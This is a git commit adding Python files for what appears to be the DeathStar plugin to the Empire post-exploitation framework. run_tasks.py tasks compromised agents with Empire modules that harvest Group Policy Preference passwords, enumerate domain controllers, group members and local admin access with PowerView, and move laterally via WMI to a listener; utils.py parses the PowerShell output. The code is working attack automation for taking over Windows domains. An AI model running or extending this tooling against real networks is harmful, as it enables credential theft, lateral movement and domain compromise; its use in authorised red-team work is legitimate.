c4d66841f749d2827fdb182435c2ccdd63be66f1
Anthony Rose <20302208+Cx01N@users.noreply.github.com>
2023-05-31 15:02:26 -0400

    Add files via upload

---
+++ run_tasks.py
@@ -0,0 +1,115 @@
+from empire.server.api.v2.agent.agent_task_dto import ModulePostRequest
+
+
+class DeathStarTasks(object):
+    def __init__(self, main_menu):
+        self.main_menu = main_menu
+
+    def run_get_gpp(self, db, session_id):
+        agent = self.main_menu.agentsv2.get_by_id(db, session_id)
+        params = {
+            "Agent": session_id,
+            "OutputFunction": "Out-String",
+        }
+        module_post_request = ModulePostRequest(
+            module_id="powershell_privesc_gpp", options=params
+        )
+        res, err = self.main_menu.agenttasksv2.create_task_module(
+            db, agent, module_post_request, 0
+        )
+
+        if not err:
+            return res.id
+        else:
+            return False
+
+    def run_get_domain_controller(self, db, session_id):
+        agent = self.main_menu.agentsv2.get_by_id(db, session_id)
+        params = {
+            "Agent": session_id,
+            "OutputFunction": "Out-String",
+        }
+        module_post_request = ModulePostRequest(
+            module_id="powershell_situational_awareness_network_powerview_get_domain_controller",
+            options=params,
+        )
+        res, err = self.main_menu.agenttasksv2.create_task_module(
+            db, agent, module_post_request, 0
+        )
+
+        if not err:
+            return res.id
+        else:
+            return False
+
+    def run_get_group_member(self, db, sid, session_id):
+        agent = self.main_menu.agentsv2.get_by_id(db, session_id)
+        params = {
+            "Agent": session_id,
+            "OutputFunction": "Out-String",
+            "Identity": sid,
+            "Recurse": "True",
+        }
+        module_post_request = ModulePostRequest(
+            module_id="powershell_situational_awareness_network_powerview_get_group_member",
+            options=params,
+        )
+        res, err = self.main_menu.agenttasksv2.create_task_module(
+            db, agent, module_post_request, 0
+        )
+
+        if not err:
+            return res.id
+        else:
+            return False
+
+    def run_find_localadmin(self, db, session_id, domain_controller, domain):
+        agent = self.main_menu.agentsv2.get_by_id(db, session_id)
+        params = {
+            "Agent": session_id,
+            "OutputFunction": "Out-String",
+            "ComputerDomain": domain,
+            "Server": domain_controller,
+            "ServerTimeLimit": "60",
+        }
+        module_post_request = ModulePostRequest(
+            module_id="powershell_situational_awareness_network_powerview_find_localadmin_access",
+            options=params,
+        )
+        res, err = self.main_menu.agenttasksv2.create_task_module(
+            db, agent, module_post_request, 0
+        )
+
+        if not err:
+            return res.id
+        else:
+            return False
+
+    def run_invoke_wmi(self, db, session_id, listener, computer_name):
+        agent = self.main_menu.agentsv2.get_by_id(db, session_id)
+        params = {
+            "Agent": session_id,
+            "Listener": listener,
+            "UserName": "",
+            "Password": "",
+            "OutputFunction": "Out-String",
+            "ComputerName": computer_name,
+            "Obfuscate": "False",
+            "ObfuscationCommand": r"Token\All\1",
+            "ProxyCreds": "default",
+            "Proxy": "default",
+            "UserAgent": "default",
+        }
+        module_post_request = ModulePostRequest(
+            module_id="powershell_lateral_movement_invoke_wmi",
+            options=params,
+        )
+        res, err = self.main_menu.agenttasksv2.create_task_module(
+            db, agent, module_post_request, 0
+        )
+
+        if not err:
+            return res.id
+        else:
+            print("Error")
+            return False
---
+++ utils.py
@@ -0,0 +1,76 @@
+def posh_object_parser(output):
+    parsed_output = []
+
+    blocks = list(filter(len, output.split("\r\n\r\n")))
+    if blocks[-1].lower().find("completed") > 0:
+        blocks.pop()
+
+    for block in blocks:
+        parsed_block = {}
+        for entry in block.split("\r\n"):
+            try:
+                key, value = entry.split(":", 1)
+            except ValueError:
+                previous_key = list(parsed_block.keys())[-1]
+                previous_value = parsed_block[previous_key]
+                parsed_block[previous_key] = previous_value + entry.strip()
+            else:
+                parsed_block[key.strip().lower()] = value.strip()
+
+        parsed_output.append(parsed_block)
+
+    return parsed_output
+
+
+def posh_table_parser(output):
+    parsed_output = []
+
+    blocks = list(filter(len, output.splitlines()))
+    if blocks[-1].lower().find("completed") > 0:
+        blocks.pop()
+
+    title = blocks[0]
+    word_start_positions = []
+    for index, char in enumerate(title):
+        if index == 0 and char != " ":
+            word_start_positions.append(index)
+        elif char != " " and title[index - 1] == " ":
+            word_start_positions.append(index)
+
+    keys = title.split()
+    word_pos_to_key = {k: v.lower() for k, v in zip(word_start_positions, keys)}
+    blocks = blocks[2:]
+
+    for row in blocks:
+        parsed_row_values = {}
+        for start_pos in word_start_positions:
+            for index, char in enumerate(row):
+                if index == start_pos:
+                    if char == " ":
+                        parsed_row_values[word_pos_to_key[start_pos]] = ""
+                        break
+
+                if index > start_pos:
+                    if index == (len(row) - 1) and char != " ":
+                        parsed_row_values[word_pos_to_key[start_pos]] = row[
+                            start_pos : index + 1
+                        ]
+                        break
+
+                    if char == " " and row[index - 1] != " ":
+                        parsed_row_values[word_pos_to_key[start_pos]] = row[
+                            start_pos:index
+                        ]
+                        break
+
+        parsed_output.append(parsed_row_values)
+
+    return parsed_output
+
+
+# This is janky and could be better
+# kybercrystals = importlib.import_module("empire.server.plugins.DeathStar-Plugin.kybercrystals")
+# self.kybers = kybercrystals.KyberCrystals(self)
+#
+# planetaryrecon = importlib.import_module("empire.server.plugins.DeathStar-Plugin.planetaryrecon")
+# self.recon = planetaryrecon.PlanetaryRecon()
